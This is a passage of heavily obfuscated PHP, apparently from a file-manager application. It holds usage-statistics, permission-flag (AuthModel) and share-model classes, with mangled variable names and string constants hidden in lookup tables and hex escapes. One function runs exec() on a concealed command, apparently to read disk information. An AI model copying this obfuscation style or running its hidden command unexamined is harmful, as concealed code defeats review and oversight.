$øÑ›ÀÊø = array($Ø™¾ù•‚[232] => $¬ìéÓñ», $Ø™¾ù•‚[760] => (int) $ˆÀµÒ€ß, $Ø™¾ù•‚[1671] => (int) $Ø¡¡Ç†¾, $Ø™¾ù•‚[1672] => (int) $ëœşÙª‚); return $this->insert($øÑ›ÀÊø); } public function _recordStore($ÖÁŒõØè = '') { $­‘ôé·— =& $_SERVER[Á÷ ­Šë]; $ô®ÙÙÀù = strtotime(date($­‘ôé·—[1683], strtotime($ÖÁŒõØè))); $Í¡ñŠ•Â = array($­‘ôé·—[204] => array($­‘ôé·—[1005], $ô®ÙÙÀù)); $ÀõÕÂ—À = Model($­‘ôé·—[474])->where($Í¡ñŠ•Â)->sum($­‘ôé·—[88]); $Í¡ñŠ•Â[$­‘ôé·—[415]] = 0; $à¨åÓû = Model($­‘ôé·—[827])->where($Í¡ñŠ•Â)->sum($­‘ôé·—[88]); $Í¡ñŠ•Â[$­‘ôé·—[416]] = 1; $Ëë¼ƒúÕ = Model($­‘ôé·—[827])->where($Í¡ñŠ•Â)->sum($­‘ôé·—[88]); $Í¡ñŠ•Â[$­‘ôé·—[416]] = 2; $©µøŸ¯ = Model($­‘ôé·—[827])->where($Í¡ñŠ•Â)->sum($­‘ôé·—[88]); $£¶òµµ = array($­‘ôé·—[232] => $ÖÁŒõØè, $­‘ôé·—[758] => (int) $à¨åÓû, $­‘ôé·—[1675] => (int) $ÀõÕÂ—À, $­‘ôé·—[1676] => (int) $Ëë¼ƒúÕ, $­‘ôé·—[1677] => (int) $©µøŸ¯); return $this->insert($£¶òµµ); } public function trend($´€ÂÅşƒ, $â†å½äì) { $–²®×úÈ =& $_SERVER[Á÷ ­Šë]; if (!$this->init($´€ÂÅşƒ)) { return !1; } $‚Ò©á® = $this->trendList($´€ÂÅşƒ); if ($‚Ò©á® && $â†å½äì != $–²®×úÈ[1547]) { $ç‰–Ô» = $‚Ò©á®[0][$–²®×úÈ[232]]; $¸á§¶Ê„ = $this->validDate($â†å½äì, $ç‰–Ô»); $ëÉĞÇ® = array(); $İê½´ = array_to_keyvalue($‚Ò©á®, $–²®×úÈ[232]); foreach ($¸á§¶Ê„ as $ªã¥ªûà) { if (isset($İê½´[$ªã¥ªûà])) { $çª¹®Ì… = $İê½´[$ªã¥ªûà]; } else { $çª¹®Ì… = end($‚Ò©á®); $çª¹®Ì…[$–²®×úÈ[232]] = $ªã¥ªûà; if ($´€ÂÅşƒ == $–²®×úÈ[598]) { $çª¹®Ì…[$–²®×úÈ[1671]] = $çª¹®Ì…[$–²®×úÈ[1672]] = 0; } } $ëÉĞÇ®[] = $çª¹®Ì…; } $‚Ò©á® = $ëÉĞÇ®; } $»Õåè = array($–²®×úÈ[598] => array($–²®×úÈ[760] => LNG($–²®×úÈ[1687]), $–²®×úÈ[1671] => LNG($–²®×úÈ[1688]), $–²®×úÈ[1672] => LNG($–²®×úÈ[1689])), $–²®×úÈ[1673] => array($–²®×úÈ[758] => LNG($–²®×úÈ[1690]), $–²®×úÈ[1675] => LNG($–²®×úÈ[1691]), $–²®×úÈ[1676] => LNG($–²®×úÈ[1692]), $–²®×úÈ[1677] => LNG($–²®×úÈ[1693]))); $€¤Ù£ñ = array($–²®×úÈ[598] => $–²®×úÈ[1694], $–²®×úÈ[1673] => $–²®×úÈ[88]); if (empty($‚Ò©á®)) { $ªã¥ªûà = date($–²®×úÈ[1678], strtotime($–²®×úÈ[1679])); $ÒÚı–Åú = array($–²®×úÈ[232] => $ªã¥ªûà); foreach ($»Õåè[$´€ÂÅşƒ] as $²î‚ÎşÀ => $Ãœ°¸ŒÏ) { $ÒÚı–Åú[$²î‚ÎşÀ] = 0; } $‚Ò©á®[] = $ÒÚı–Åú; } $—˜‘ß÷¸ = array(); foreach ($‚Ò©á® as $Ãœ°¸ŒÏ) { if ($´€ÂÅşƒ == $–²®×úÈ[1673] && $Ãœ°¸ŒÏ[$–²®×úÈ[1675]] > $Ãœ°¸ŒÏ[$–²®×úÈ[758]]) { $Ãœ°¸ŒÏ[$–²®×úÈ[1675]] = $Ãœ°¸ŒÏ[$–²®×úÈ[758]]; } foreach ($»Õåè[$´€ÂÅşƒ] as $²î‚ÎşÀ => $âÉ”¦øÀ) { $çª¹®Ì… = array($–²®×úÈ[232] => $Ãœ°¸ŒÏ[$–²®×úÈ[232]], $–²®×úÈ[1474] => $âÉ”¦øÀ); $çª¹®Ì…[$€¤Ù£ñ[$´€ÂÅşƒ]] = isset($Ãœ°¸ŒÏ[$²î‚ÎşÀ]) ? $Ãœ°¸ŒÏ[$²î‚ÎşÀ] : 0; $—˜‘ß÷¸[] = $çª¹®Ì…; } } return $—˜‘ß÷¸; } public function validDate($­åõé», $§®¨¸Ëš) { $ñÅİ´åˆ =& $_SERVER[Á÷ ­Šë]; $´â•€Ï¯ = date($ñÅİ´åˆ[1678], strtotime($ñÅİ´åˆ[1679])); $”‚îÒš© = array($´â•€Ï¯); switch ($­åõé») { case $ñÅİ´åˆ[1554]: $¸€ °‚ = mktime(0, 0, 0, date($ñÅİ´åˆ[1695]), date($ñÅİ´åˆ[1297]) - date($ñÅİ´åˆ[1358]) + 7 - 7, date($ñÅİ´åˆ[1696])); $õåÈ©Üë = 0; do { $÷ê¯èè = date($ñÅİ´åˆ[1678], $¸€ °‚ - 3600 * 24 * 7 * $õåÈ©Üë); $”‚îÒš©[] = $÷ê¯èè; $õåÈ©Üë++; } while ($§®¨¸Ëš < $÷ê¯èè); break; case $ñÅİ´åˆ[1552]: $õåÈ©Üë = 1; do { $»Ê­½¤ = date($ñÅİ´åˆ[1697], strtotime("\55\40{$õåÈ©Üë}\40\x6d\x6f\x6e\164\x68\x73")); $”‚îÒš©[] = $»Ê­½¤; $õåÈ©Üë++; } while ($§®¨¸Ëš < $»Ê­½¤); break; case $ñÅİ´åˆ[1698]: $®€åç—Ö = (int) date($ñÅİ´åˆ[1696], strtotime($§®¨¸Ëš)); $À¦¨ìÚÌ = (int) date($ñÅİ´åˆ[1696]); if ($®€åç—Ö >= $À¦¨ìÚÌ) { break; } for ($®€åç—Ö; $®€åç—Ö < $À¦¨ìÚÌ; $®€åç—Ö++) { $”‚îÒš©[] = $®€åç—Ö . $ñÅİ´åˆ[1699]; } break; default: break; } if ($§®¨¸Ëš > end($”‚îÒš©)) { array_pop($”‚îÒš©); } sort($”‚îÒš©); return $”‚îÒš©; } public function listTable($Êó°ìÁ¯) { $ş¤ø½Ÿ¦ = ucfirst($Êó°ìÁ¯); return Model($ş¤ø½Ÿ¦)->listData(); } public function option($Ø„×ïÜä) { $ÚÂ†ÁÎç = $_SERVER[Á÷ ­Šë][1700] . ucfirst($Ø„×ïÜä); return $this->{$ÚÂ†ÁÎç}(); } private function optionUser() { $ä«€ãüá =& $_SERVER[Á÷ ­Šë]; $è­İòÙ‘ = Model($ä«€ãüá[542])->count($ä«€ãüá[1574]); $Í¯ïªŞ = Model($ä«€ãüá[542])->where($ä«€ãüá[1701])->count($ä«€ãüá[1574]); $î¼†¬ãœ = intval($GLOBALS[$ä«€ãüá[6]][$ä«€ãüá[356]][$ä«€ãüá[1530]]) / 3600; $ËÚşåÉÌ = strtotime("\55{$î¼†¬ãœ}\40\150\x6f\x75\162\163"); $Ã“Ğ§ë– = strtotime(date($ä«€ãüá[1682])); if ($ËÚşåÉÌ < $Ã“Ğ§ë–) { $ËÚşåÉÌ = $Ã“Ğ§ë–; } $€„ùùÅı = array($ä«€ãüá[1702] => array($ä«€ãüá[1006], $ËÚşåÉÌ)); $ôÑë³¥¼ = (int) Model($ä«€ãüá[542])->where($€„ùùÅı)->count($ä«€ãüá[1574]); if (!$ôÑë³¥¼) { $ôÑë³¥¼ = 1; } $€„ùùÅı = array($ä«€ãüá[1702] => array($ä«€ãüá[1006], $Ã“Ğ§ë–)); $â’‚ƒ‡æ = Model($ä«€ãüá[542])->where($€„ùùÅı)->count($ä«€ãüá[1574]); return array($ä«€ãüá[754] => (int) $è­İòÙ‘, $ä«€ãüá[1703] => (int) ($è­İòÙ‘ - $Í¯ïªŞ), $ä«€ãüá[1704] => (int) $Í¯ïªŞ, $ä«€ãüá[1705] => (int) $â’‚ƒ‡æ, $ä«€ãüá[1706] => $ôÑë³¥¼); } private function optionFile() { $ö°±‘Ù„ =& $_SERVER[Á÷ ­Šë]; $¥¸°ö = $this->sourceSize(); $®û Ñ– = $¥¸°ö[$ö°±‘Ù„[88]]; $úÅÌßÎ = $¥¸°ö[$ö°±‘Ù„[1675]]; $¨‘Ö­ = Model($ö°±‘Ù„[827])->where(array($ö°±‘Ù„[415] => 0))->count($ö°±‘Ù„[407]); $îª‰±üß = array($ö°±‘Ù„[415] => 0, $ö°±‘Ù„[204] => array($ö°±‘Ù„[1006], strtotime(date($ö°±‘Ù„[1682])))); $¸í†œ®ç = Model($ö°±‘Ù„[827])->where($îª‰±üß)->sum($ö°±‘Ù„[88]); $¿šò˜’Ò = Model($ö°±‘Ù„[827])->where($îª‰±üß)->count($ö°±‘Ù„[407]); return array($ö°±‘Ù„[758] => $®û Ñ–, $ö°±‘Ù„[1675] => $úÅÌßÎ, $ö°±‘Ù„[1707] => $®û Ñ– - $úÅÌßÎ, $ö°±‘Ù„[1708] => (int) $¸í†œ®ç, $ö°±‘Ù„[760] => (int) $¨‘Ö­, $ö°±‘Ù„[1709] => (int) $¿šò˜’Ò); } private function optionAccess() { $¹êÍÈá =& $_SERVER[Á÷ ­Šë]; return array($¹êÍÈá[754] => $this->typeLogCnt(), $¹êÍÈá[117] => $this->typeLogCnt($¹êÍÈá[117]), $¹êÍÈá[454] => $this->typeLogCnt($¹êÍÈá[454]), $¹êÍÈá[1710] => $this->typeLogCnt($¹êÍÈá[1710]), $¹êÍÈá[1711] => $this->typeLogCnt($¹êÍÈá[1711]), $¹êÍÈá[598] => $this->typeLogCnt($¹êÍÈá[33], $¹êÍÈá[1686])); } private function typeLogCnt($¯˜×–»æ = '', $¤§æïÎ• = "\151\x64") { $“ÂÊø¬ã =& $_SERVER[Á÷ ­Šë]; $”úÖü– = array($“ÂÊø¬ã[117] => array($“ÂÊø¬ã[1712], $“ÂÊø¬ã[1713]), $“ÂÊø¬ã[454] => array($“ÂÊø¬ã[1714], $“ÂÊø¬ã[1715]), $“ÂÊø¬ã[1710] => array($“ÂÊø¬ã[1716], $“ÂÊø¬ã[1717], $“ÂÊø¬ã[1718]), $“ÂÊø¬ã[1711] => array($“ÂÊø¬ã[1719], $“ÂÊø¬ã[1720]), $“ÂÊø¬ã[1721] => array($“ÂÊø¬ã[1722], $“ÂÊø¬ã[1723], $“ÂÊø¬ã[1724])); $ÔŒó¹™‹ = strtotime(date($“ÂÊø¬ã[1682])); $†”˜ºšÖ = array($“ÂÊø¬ã[204] => array($“ÂÊø¬ã[1006], $ÔŒó¹™‹)); if ($¯˜×–»æ) { $†”˜ºšÖ[$“ÂÊø¬ã[29]] = array($“ÂÊø¬ã[7], $”úÖü–[$¯˜×–»æ]); } $âùÈ—¦ = Model($“ÂÊø¬ã[1685])->where($†”˜ºšÖ)->count($¤§æïÎ•); return (int) $âùÈ—¦; } private function optionServer() { $É­¢Å… =& $_SERVER[Á÷ ­Šë]; $—ÖÜ¶š = $this->diskDriver(); $ÁÕïİğı = KodIO::defaultDriver(); $¦­Æ˜¼¥ = array($É­¢Å…[819] => $ÁÕïİğı[$É­¢Å…[404]]); $ÊãÙØ­ = Model($É­¢Å…[474])->where($¦­Æ˜¼¥)->sum($É­¢Å…[88]); $¼ß‡õÀä = explode($É­¢Å…[50], $_SERVER[$É­¢Å…[152]]); $ãä÷èÂÊ = $¼ß‡õÀä[0]; $£¤ÙÉ¥õ = $GLOBALS[$É­¢Å…[6]][$É­¢Å…[17]]; $ç”ä³®‘ = $£¤ÙÉ¥õ[$É­¢Å…[967]]; if ($ç”ä³®‘ == $É­¢Å…[792]) { $»ÎèÅ² = explode($É­¢Å…[1198], $£¤ÙÉ¥õ[$É­¢Å…[966]]); $ç”ä³®‘ = $»ÎèÅ²[0]; } if ($ç”ä³®‘ == $É­¢Å…[795] || $ç”ä³®‘ == $É­¢Å…[796]) { $âĞœÜ¬Ş = Model()->db()->query($É­¢Å…[1725]); $ÔÈçÇš = $âĞœÜ¬Ş[0] && isset($âĞœÜ¬Ş[0][$É­¢Å…[1473]]) ? $âĞœÜ¬Ş[0][$É­¢Å…[1473]] : 0; $ç”ä³®‘ = $É­¢Å…[1726] . ($ÔÈçÇš ? $É­¢Å…[8] . $ÔÈçÇš : $É­¢Å…[33]); } $Õ³û¨ìı = $GLOBALS[$É­¢Å…[6]][$É­¢Å…[356]][$É­¢Å…[829]]; return array($É­¢Å…[1727] => $—ÖÜ¶š ? $—ÖÜ¶š[$É­¢Å…[1728]] : 0, $É­¢Å…[1729] => $—ÖÜ¶š ? $—ÖÜ¶š[$É­¢Å…[1730]] : 0, $É­¢Å…[1731] => (int) $ÁÕïİğı[$É­¢Å…[1728]] * 1024 * 1024 * 1024, $É­¢Å…[1732] => (int) $ÊãÙØ­, $É­¢Å…[1733] => ucfirst($ãä÷èÂÊ), $É­¢Å…[1734] => $É­¢Å…[1735] . PHP_VERSION, $É­¢Å…[1736] => phpBuild64() ? 64 : 32, $É­¢Å…[753] => str_replace($É­¢Å…[1737], $É­¢Å…[983], $ç”ä³®‘), $É­¢Å…[356] => ucfirst($Õ³û¨ìı), $É­¢Å…[28] => $_SERVER[$É­¢Å…[1738]]); } private function diskDriver() { $¡ß—óıã =& $_SERVER[Á÷ ­Šë]; $Ğ¢€ú‹– = $¡ß—óıã[8]; $‘øİä†Ë = $GLOBALS[$¡ß—óıã[6]][$¡ß—óıã[1214]] == $¡ß—óıã[1215]; if ($‘øİä†Ë) { $Ğ¢€ú‹– = $¡ß—óıã[1739]; if (function_exists($¡ß—óıã[1740])) { exec($¡ß—óıã[1741], $š¦Üèà); $Ğ¢€ú‹– = $š¦Üèà[1] . $¡ß—óıã[8]; } } if (!file_exists($Ğ¢€ú‹–)) { return; } $Ü‡äÈûé = @disk_total_space($Ğ¢€ú‹–); $×ÉÏ¤ÄÜ = $Ü‡äÈûé - @disk_free_space($Ğ¢€ú‹–); return array($¡ß—óıã[1728] => $Ü‡äÈûé, $¡ß—óıã[1730] => $×ÉÏ¤ÄÜ); } public function fileChart($Ú©…úïú) { $ĞÛ…ä×´ =& $_SERVER[Á÷ ­Šë]; if (isset($Ú©…úïú[$ĞÛ…ä×´[1574]])) { return Model($ĞÛ…ä×´[827])->userFileTypeProfile($Ú©…úïú[$ĞÛ…ä×´[1574]]); } if (isset($Ú©…úïú[$ĞÛ…ä×´[1742]])) { return Model($ĞÛ…ä×´[827])->groupFileTypeProfile($Ú©…úïú[$ĞÛ…ä×´[1742]]); } $äçú¬™“ = $this->sourceSize(); $‰²ö¸±æ = array($ĞÛ…ä×´[502] => 0, $ĞÛ…ä×´[416] => 1); $şåáĞØ½ = Model($ĞÛ…ä×´[827])->where($‰²ö¸±æ)->sum($ĞÛ…ä×´[88]); $‰²ö¸±æ[$ĞÛ…ä×´[416]] = 2; $™ÕæŒ±¸ = Model($ĞÛ…ä×´[827])->where($‰²ö¸±æ)->sum($ĞÛ…ä×´[88]); return array($ĞÛ…ä×´[758] => $äçú¬™“[$ĞÛ…ä×´[88]], $ĞÛ…ä×´[1675] => $äçú¬™“[$ĞÛ…ä×´[1675]], $ĞÛ…ä×´[1676] => (int) $şåáĞØ½, $ĞÛ…ä×´[1677] => (int) $™ÕæŒ±¸); } private function sourceSize() { $”²Òéş÷ =& $_SERVER[Á÷ ­Šë]; $¥¥ì°¹§ = Model($”²Òéş÷[827])->where(array($”²Òéş÷[415] => 0))->sum($”²Òéş÷[88]); $¯œøº¤ = Model($”²Òéş÷[474])->sum($”²Òéş÷[88]); if ($¯œøº¤ > $¥¥ì°¹§) { $¯œøº¤ = $¥¥ì°¹§; } return array($”²Òéş÷[88] => (int) $¥¥ì°¹§, $”²Òéş÷[1675] => (int) $¯œøº¤); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $€¡©£Øç =& $_SERVER[Á÷ ­Šë]; $®Å¤Æö” = array(array($€¡©£Øç[425] => LNG($€¡©£Øç[1743]), $€¡©£Øç[1744] => $€¡©£Øç[1745], $€¡©£Øç[1746] => 1, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($€¡©£Øç[425] => LNG($€¡©£Øç[1749]), $€¡©£Øç[1744] => $€¡©£Øç[1750], $€¡©£Øç[1746] => 2, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($€¡©£Øç[425] => LNG($€¡©£Øç[1751]), $€¡©£Øç[1744] => $€¡©£Øç[1752], $€¡©£Øç[1746] => 3, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($€¡©£Øç[425] => LNG($€¡©£Øç[1753]), $€¡©£Øç[1744] => $€¡©£Øç[1754], $€¡©£Øç[1746] => 4, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_VIEW), array($€¡©£Øç[425] => LNG($€¡©£Øç[1755]), $€¡©£Øç[1744] => $€¡©£Øç[1756], $€¡©£Øç[1746] => 5, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($€¡©£Øç[425] => LNG($€¡©£Øç[1757]), $€¡©£Øç[1744] => $€¡©£Øç[1758], $€¡©£Øç[1746] => 6, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($€¡©£Øç[425] => LNG($€¡©£Øç[1759]), $€¡©£Øç[1744] => $€¡©£Øç[1760], $€¡©£Øç[1746] => 7, $€¡©£Øç[1747] => 1, $€¡©£Øç[1748] => 0)); return $®Å¤Æö”; } public static function authCheck($êÅÕù˜Ò, $Ú©¾ìÂÛ) { $êÅÕù˜Ò = intval($êÅÕù˜Ò); if ($GLOBALS[$_SERVER[Á÷ ­Šë][509]]) { return !0; } if ($êÅÕù˜Ò <= 0) { return !1; } if (($êÅÕù˜Ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($êÅÕù˜Ò & $Ú©¾ìÂÛ); } public static function authCheckShow($ı¼ŸËí) { return self::authCheck($ı¼ŸËí, self::AUTH_SHOW); } public static function authCheckView($ş¦‹šÔ) { return self::authCheck($ş¦‹šÔ, self::AUTH_VIEW); } public static function authCheckDownload($æ”¿ ®¡) { return self::authCheck($æ”¿ ®¡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ííÚ×ò) { return self::authCheck($ííÚ×ò, self::AUTH_UPLOAD); } public static function authCheckEdit($¤®š—ëÃ) { return self::authCheck($¤®š—ëÃ, self::AUTH_EDIT); } public static function authCheckRemove($™€¬¡§) { return self::authCheck($™€¬¡§, self::AUTH_REMOVE); } public static function authCheckShare($ÜÖ¦ƒŸ£) { return self::authCheck($ÜÖ¦ƒŸ£, self::AUTH_SHARE); } public static function authCheckComment($¹Ç‡ıë») { return self::authCheck($¹Ç‡ıë», self::AUTH_COMMENT); } public static function authCheckEvent($°€Ì»ì†) { return self::authCheck($°€Ì»ì†, self::AUTH_EVENT); } public static function authCheckRoot($ã‘›ô£Ó) { return self::authCheck($ã‘›ô£Ó, self::AUTH_ROOT); } public static function authCheckAction($œšîÈ†ğ, $üåÅË½) { $úÁ§Ñ×ù =& $_SERVER[Á÷ ­Šë]; $•†ü°ß  = array($úÁ§Ñ×ù[1761] => self::AUTH_VIEW, $úÁ§Ñ×ù[1125] => self::AUTH_DOWNLOAD, $úÁ§Ñ×ù[117] => self::AUTH_UPLOAD, $úÁ§Ñ×ù[1711] => self::AUTH_EDIT, $úÁ§Ñ×ù[1710] => self::AUTH_REMOVE, $úÁ§Ñ×ù[1721] => self::AUTH_SHARE, $úÁ§Ñ×ù[361] => self::AUTH_COMMENT, $úÁ§Ñ×ù[1562] => self::AUTH_EVENT, $úÁ§Ñ×ù[1762] => self::AUTH_ROOT); if (!isset($•†ü°ß [$üåÅË½])) { return; } $—£ÈÃíŒ = $•†ü°ß [$üåÅË½]; $œšîÈ†ğ = intval($œšîÈ†ğ); if ($œšîÈ†ğ <= 0) { return !1; } if (($œšîÈ†ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($œšîÈ†ğ & $—£ÈÃíŒ); } public static function authDisable($àïÀò¨, $…ôèÙÆé) { if (intval($àïÀò¨) <= 0) { return 0; } return intval($àïÀò¨) & ~$…ôèÙÆé; } public $optionType = "\123\x79\163\164\145\155\56\x73\157\x75\x72\x63\145\x41\165\x74\x68\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\x75\164\x68", "\154\x61\142\145\x6c", "\x64\151\163\160\154\141\171", "\x73\171\163\164\x65\155", "\163\x6f\x72\x74"); public function initData() { $îÜ·Äª· = $this->authDefault(); foreach ($îÜ·Äª· as $•Çî”Ø) { $this->add($•Çî”Ø); } } public function findAuth($Ü–¿Æ—Â, $‡´™”åœ) { $ıÎÌÈ³˜ =& $_SERVER[Á÷ ­Šë]; $ûËä×é = parent::listData(); foreach ($ûËä×é as $ï»Óç¨) { $üå¯®Æç = intval($ï»Óç¨[$ıÎÌÈ³˜[418]]); if ($üå¯®Æç <= 0 || $ï»Óç¨[$ıÎÌÈ³˜[1763]] == 0) { continue; } if (($üå¯®Æç & $Ü–¿Æ—Â) != $Ü–¿Æ—Â) { continue; } if (($üå¯®Æç & $‡´™”åœ) != 0) { continue; } return $ï»Óç¨[$ıÎÌÈ³˜[404]]; } return !1; } public function findAuthReadOnly() { $€‘ÖŸìÍ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $êêŞ¡ö­ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($€‘ÖŸìÍ, $êêŞ¡ö­); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($åùü‚÷à = false, $‹ÈµÒ…á = "\163\x6f\162\164", $ì®¸‡£å = false) { return parent::listData($åùü‚÷à, $‹ÈµÒ…á, $ì®¸‡£å); } public function update($â³é„Ñ, $¸ïÂ¯Õ–) { $†ã°ñä€ =& $_SERVER[Á÷ ­Šë]; $­ïú£ƒ = parent::listData($â³é„Ñ); $ãç¢ñ²® = $this->findByName($¸ïÂ¯Õ–[$†ã°ñä€[28]]); if (!$­ïú£ƒ || $ãç¢ñ²® && $ãç¢ñ²®[$†ã°ñä€[404]] != $­ïú£ƒ[$†ã°ñä€[404]]) { return !1; } $this->filterAuth($¸ïÂ¯Õ–[$†ã°ñä€[418]]); return parent::update($â³é„Ñ, $¸ïÂ¯Õ–); } public function remove($ÊŠ¢’Ç‘) { $Ÿ ß¿§Ì = parent::listData($ÊŠ¢’Ç‘); if (!$Ÿ ß¿§Ì || $Ÿ ß¿§Ì[$_SERVER[Á÷ ­Šë][1202]]) { return !1; } return parent::remove($ÊŠ¢’Ç‘); } public function add($ğ†×ÒÉ  = array()) { $›ÌÉ¤‹‹ =& $_SERVER[Á÷ ­Šë]; if ($this->findByName($ğ†×ÒÉ [$›ÌÉ¤‹‹[28]])) { return !1; } $Ê¨ñ¨è = array($›ÌÉ¤‹‹[28] => $›ÌÉ¤‹‹[33], $›ÌÉ¤‹‹[418] => 1, $›ÌÉ¤‹‹[1764] => $›ÌÉ¤‹‹[1752], $›ÌÉ¤‹‹[1763] => 1, $›ÌÉ¤‹‹[1202] => 0, $›ÌÉ¤‹‹[1765] => 0); $ğ†×ÒÉ  = array_merge($Ê¨ñ¨è, $ğ†×ÒÉ ); $ğ†×ÒÉ [$›ÌÉ¤‹‹[1765]] = $this->getSort(); $this->filterAuth($ğ†×ÒÉ [$›ÌÉ¤‹‹[418]]); return parent::insert($ğ†×ÒÉ ); } private function getSort() { $˜ç„ŸÊ =& $_SERVER[Á÷ ­Šë]; $¥ÆñÈİ = parent::listData(); $É†¿¹õÓ = array_to_keyvalue($¥ÆñÈİ, $˜ç„ŸÊ[33], $˜ç„ŸÊ[1765]); return empty($É†¿¹õÓ) ? 0 : max($É†¿¹õÓ) + 1; } private function filterAuth(&$ÜïŒº´Ï) { if (!$ÜïŒº´Ï) { return; } $×Â÷›¶ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $šéÍˆó = array(); foreach ($×Â÷›¶ as $­ Ğ¹±) { if ($ÜïŒº´Ï & $­ Ğ¹±) { $šéÍˆó[] = $­ Ğ¹±; } } if (in_array(self::AUTH_ROOT, $šéÍˆó)) { $ÜïŒº´Ï = array_sum($×Â÷›¶); return; } $ÌŒ§ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($šéÍˆó as $­ Ğ¹±) { if (isset($ÌŒ§[$­ Ğ¹±])) { $šéÍˆó = array_merge($šéÍˆó, $ÌŒ§[$­ Ğ¹±]); } } $šéÍˆó[] = self::AUTH_SHOW; $ÜïŒº´Ï = array_sum(array_unique($šéÍˆó)); } public function sort($ùò­ÌŞæ, $ƒóøÕ«) { return parent::update($ùò­ÌŞæ, $ƒóøÕ«); } } goto aÀàªïåÖ•; bÒÉ©÷ØƒÇ: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\124\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\162\164\54\x75\160\x64\x61\164\x65", "\x66\x75\156\143\164\151\x6f\156"), array("\x63\x72\x65\141\164\145\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\165\x6e\143\x74\x69\157\x6e"), array("\x6f\160\x74\x69\x6f\x6e\163", '', "\151\156\x73\x65\162\164\x2c\165\x70\x64\141\x74\x65\54\163\145\x6c\x65\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÎÊØíœ) { $ïîüÆŞÑ =& $_SERVER[Á÷ ­Šë]; $ÇáıßÏ¿ = isset($ÎÊØíœ[0]) ? $ÎÊØíœ[0] : !1; return array($ïîüÆŞÑ[1878] => array(USER_ID, $ïîüÆŞÑ[1879]), $ïîüÆŞÑ[1821] => array($ÇáıßÏ¿, $ïîüÆŞÑ[1880])); } protected function listSimple() { $ê¶²…ºœ = array($_SERVER[Á÷ ­Šë][1574] => USER_ID); $è¾£®—Æ = $this->field($this->fieldList)->where($ê¶²…ºœ)->select(); return $è¾£®—Æ ? $è¾£®—Æ : array(); } protected function getInfo($•¿Ë´¨, $òğààÓ‹ = false) { $í¨äÊ¶Â =& $_SERVER[Á÷ ­Šë]; if ($òğààÓ‹) { return $this->_getShareInfo(array($í¨äÊ¶Â[492] => $•¿Ë´¨)); } $ÆÊß¯º = $this->cacheFunctionGet($í¨äÊ¶Â[1823], $•¿Ë´¨); return $ÆÊß¯º; } public function getInfoByHash($‚Ø¯ì) { return $this->_getShareInfo(array($_SERVER[Á÷ ­Šë][494] => $‚Ø¯ì)); } public function getInfoByPath($ÍíıÔ˜) { $´ò°ÊŸ =& $_SERVER[Á÷ ­Šë]; $£ªó· = array($´ò°ÊŸ[1574] => USER_ID, $´ò°ÊŸ[407] => $ÍíıÔ˜); return $this->_getShareInfo($£ªó·); } public function getInfoBySourcePath($Ë“‡¾öõ) { $şØŸ€õ¬ =& $_SERVER[Á÷ ­Šë]; $ßêÆ‡âà = array($şØŸ€õ¬[1574] => USER_ID, $şØŸ€õ¬[1102] => $Ë“‡¾öõ); return $this->_getShareInfo($ßêÆ‡âà); } private function _getShareInfo($İê¥Ç­Î) { $×°Şíã =& $_SERVER[Á÷ ­Šë]; $»¿™ñæ÷ = $this->where($İê¥Ç­Î)->find(); if (!$»¿™ñæ÷) { return !1; } $İê¥Ç­Î = array($×°Şíã[492] => $»¿™ñæ÷[$×°Şíã[492]]); $Ò™¶Ø ” = $×°Şíã[1881]; $Ş–¨íúŞ = Model($×°Şíã[600])->order($×°Şíã[404])->field($Ò™¶Ø 